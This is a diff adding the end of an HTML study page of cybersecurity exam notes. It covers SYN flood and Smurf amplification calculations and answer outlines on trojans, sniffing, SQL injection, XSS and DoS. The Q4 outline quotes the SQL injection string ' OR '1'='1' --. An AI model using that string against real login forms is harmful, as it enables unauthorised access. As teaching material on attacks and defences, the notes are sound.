+A server has a SYN backlog queue of size **N = 500**. The OS retransmits SYN-ACK and times out a half-open entry after **T = 75 seconds** if no ACK is received. An attacker sends spoofed SYN packets at a rate of **R = 50 packets/second**.
+
+- Step 1 — Time to first fill the queue completely:
+  Time = N / R = 500 / 50 = **10 seconds**.
+- Step 2 — Minimum sustained rate to keep the queue permanently full (matching the natural eviction rate as entries time out after T seconds each):
+  Sustained rate = N / T = 500 / 75 ≈ **6.67 packets/second**.
+- Step 3 — Since attacker's actual rate (50 pkt/s) far exceeds the required sustained rate (6.67 pkt/s), the queue remains **continuously saturated**, and every legitimate client's SYN arriving after the first 10 seconds is dropped — the server is effectively unreachable for new connections as long as the attack continues.
+
+**Worked Numerical 2 (Smurf Attack Amplification):**
+A target's ISP-facing broadcast network segment has **N = 200** live hosts that respond to ICMP echo. The attacker sends spoofed ICMP Echo Requests (source = victim's IP) at a rate of **R = 10 requests/second**, each request packet sized **64 bytes**.
+
+- Step 1 — Amplification factor = N = **200×**.
+- Step 2 — Reply traffic rate hitting the victim = N × R = 200 × 10 = **2000 replies/second**.
+- Step 3 — Bandwidth consumed at the victim = 2000 replies/sec × 64 bytes = 128,000 bytes/sec = **1,024,000 bits/sec ≈ 1.024 Mbps** generated from an attacker who only sent 10 × 64 = 640 bytes/sec (≈ 5.12 kbps) — i.e., the attacker achieves roughly **200× bandwidth amplification** versus their own outbound cost, illustrating why Smurf is classified as an amplification attack.
+
+---
+
+## 5. PREVIOUS YEAR QUESTIONS (PYQs) & MOCK QUESTIONS
+
+**Q1. Explain Trojans and Backdoors. Describe any four types of Trojans with their working. (10 marks)**
+
+Model-answer outline:
+- Define Trojan (disguised, non-self-replicating malware) and Backdoor (bypass mechanism).
+- Explain overt vs covert channel briefly + one-line covert channel example.
+- Client-server working: wrap → execute → connect (direct/reverse) → C2 → persistence.
+- Pick 4 of: RAT, Data-Sending, Destructive, Proxy, FTP, Security Software Disabler — one line "what it does" each.
+
+**Q2. Differentiate between Virus and Worm. Explain the Infection Phase and Attack Phase of malware. (10 marks)**
+
+Model-answer outline:
+- Core distinction: virus needs host+user action; worm is standalone, network-self-propagating.
+- Draw/state the Virus vs Worm vs Trojan comparison table.
+- Infection Phase: search target → copy/attach → conceal (stealth/polymorphism) → check trigger.
+- Attack Phase: trigger condition met → payload executes (corrupt/delete/encrypt/exfiltrate/backdoor).
+
+**Q3. What is sniffing? Explain how ARP spoofing enables sniffing on a switched network. List protocols vulnerable to sniffing and why. (10 marks)**
+
+Model-answer outline:
+- Define sniffer; passive (hub) vs active (switch) sniffing.
+- ARP spoofing mechanism: forged gratuitous ARP replies → poisoned ARP caches → MITM traffic redirection.
+- Mention MAC flooding as an alternative active technique.
+- Table: Telnet/FTP/HTTP/SNMP/POP — cleartext credential transmission reason.
+
+**Q4. Explain SQL Injection with a suitable example. How do parameterized queries prevent it? Also explain Reflected, Stored, and DOM-based XSS. (10 marks)**
+
+Model-answer outline:
+- SQLi: vulnerable concatenated query example + `' OR '1'='1' --` injection + resulting bypassed query.
+- Parameterized queries: data bound separately from SQL structure, prevents re-interpretation as code.
+- XSS three types: Reflected (URL param echoed back), Stored (saved payload served to all viewers), DOM-based (client-side script writes untrusted data to DOM).
+- One mitigation line: output encoding/CSP/HttpOnly.
+
+**Q5. Explain SYN Flooding attack with a diagram. Differentiate DoS and DDoS. Also explain Smurf attack. (10 marks)**
+
+Model-answer outline:
+- 3-way handshake recap + half-open flood diagram; backlog queue exhaustion explanation.
+- DoS (single source) vs DDoS (botnet, distributed, coordinated via C2) — draw attacker→botnet→victim diagram.
+- Smurf: spoofed ICMP to broadcast address → N amplified replies flood victim; give amplification factor formula.
+- Optionally attach the worked numerical (N/R, N×R) to demonstrate quantitative understanding for extra marks.
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+<script src="app.js"></script>
+</body>
+</html>
